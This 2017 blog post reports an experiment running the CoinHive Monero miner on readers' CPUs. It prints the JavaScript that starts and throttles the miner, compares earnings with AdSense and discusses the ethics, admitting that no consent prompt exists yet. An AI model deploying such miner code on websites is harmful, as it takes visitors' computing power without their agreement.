---
paginate: true
comments: true
author: musikele
title: "By visiting my website you're mining cryptocurrencies for me. Here's what I found out"
category: english
layout: post
date: 2017-10-11 00:00:00 +0000
tags:
- cryptocurrencies
- mining
- monero
- coinhive
- blog
---

The day I found out that I could make some money with my blog, I was elettrified. It was (I believe) 2007. it all started with Adsense. However, for a small blog like mine, Adsense is not a perfect choice. Infact my analytics do speak for me: I'm not the most trafficked website on earth and **my blog does not have the direct scope of making me earn cash**. 

![visits for the last 30 days]({{site.baseurl}}/images/analytics-michelenasti-com.PNG)

<br />

(The purpose of this blog is **to record what I learn**.)

## And the experiment starts 


<script type="application/javascript">
function getTotalHashes() {
    if (!miner) return; 
    document.getElementById('totalHashes').innerHTML = miner.getTotalHashes();
}
setInterval(getTotalHashes, 1000);
</script>

By reading this article you've calculated <b><span id="totalHashes">0</span> hashes</b> till now.  

I heard of a new service called [CoinHive](https://coinhive.com/) that allows website owners to add a cryptocurrency miner to their website. I was too curious to not give a try.

Very simple to start: just add a `<script>` element, then start the miner via javascript, and voilà: the miner will start mining using YOUR Cpu. 

## Technical details 

the miner is not written in pure javascript; instead, it is written in WebAssembly (a way of executing "compiled" code inside browsers) to achieve the most efficient processing power. 

That said, The code I use to start the miner is: 

```javascript
var miner = new CoinHive.Anonymous('....my id on coinhive');

miner.setNumThreads(Math.min(miner.getNumThreads(), 2));

//5 seconds delay 
setTimeout(startMiner, 5000)

miner.setThrottle(0.85)

function startMiner() {

    miner.start();

    var interval = setInterval(function () {
        var threads = miner.getNumThreads();
        if (threads <= 1) {
            clearInterval(interval);
        } else {
            miner.setNumThreads(threads - 1);
        }
    }, 45 * 1000);
}
```

First of all, I instantiate a new miner with `new CoinHive.Anonymous()` function. 

Then I have decided that **I don't want to consume all the processing power of your devices**; so I'll use at max 2 threads. 

**After 5 seconds the miner starts**. This is done to not block the browser during page loading. 

**Every 45 seconds I decrease a thread**, so the miner will start using less and less power from your pc. 

When the number of threads reaches 1, I remove the  `setInterval` and the miner will work indefinitely with just one thread, until you close the browser or change page. 

## What am I mining exactely 

I'm mining [MONERO](https://it.wikipedia.org/wiki/Monero) (code: XHR), a cryptocurrency that has many interesting properties, one of which is that you can mine in the browser and the performance will be at max 2x less than by using GPUs. 

In bitcoin, [this factor is something like 400x](https://bitcointalk.org/index.php?topic=146567.0).


The current value of Moneros, at the time of writing, is 86$. 

## How rich I am now 

I have mined for a full week using my readers CPUs and I have achieved a fantastic 0.001 XHR. This means that, if I won't get new users on my blog, In about 1000 weeks (17 years) I will earn my fantastic 86 bucks. 

CoinHive takes the 30% of all the earnings (Too much!). 

Doing some more math, in one week I have earned something like **0,08 $**. 

When I was experimenting Adsense on this blog, I eaned 1,51 $ in one month; that's **0,37 $** per week.

So I agree with the [conclusions of other bloggers](https://medium.com/@MaxenceCornet/coinhive-review-embeddable-javascript-crypto-miner-806f7024cde8), that with Adsense you can earn **up to 5 times more**. 

## Ethics 

You might have understood that this is just an experiment, that I'll stop one of these days. I value my readers more than 8 cents.

And I have realized that I won't become rich by mining Moneros on your CPUs. 

> **I'm implementing a popup to alert the users of this experiment**, and to give them a way to stop this. (This takes time, because like everything on this blog, it is made by hand from me... it will be implemented shortly). 

However, is it right to mine cryptocurrencies while visiting a website? 

The answer is... depends. 

_A blogger would really like to earn some cash_ while writing articles, but usually he will not earn anything at all if the blog does not have any visits. 

The CPU is usually a wasted resource on desktop computers, and it is unexpensive for visitors to let websites use their CPU. Many users don't even bother to know. 

In the future, websites may use Monero's mining by implementing services that measures the user's hashing and allows them to earn coins to use their services. 

On the other hand, many users are concerned of what their CPU is doing all the time. 

The same applies for ads and banners: **everybody uses an Ad blocker**, because in the past websites used an excess of banners on websites and it was impossible to read an article without closing 3-4 popups. Now the situation has got better. These banners helped websites to pay contributors and the bill. 

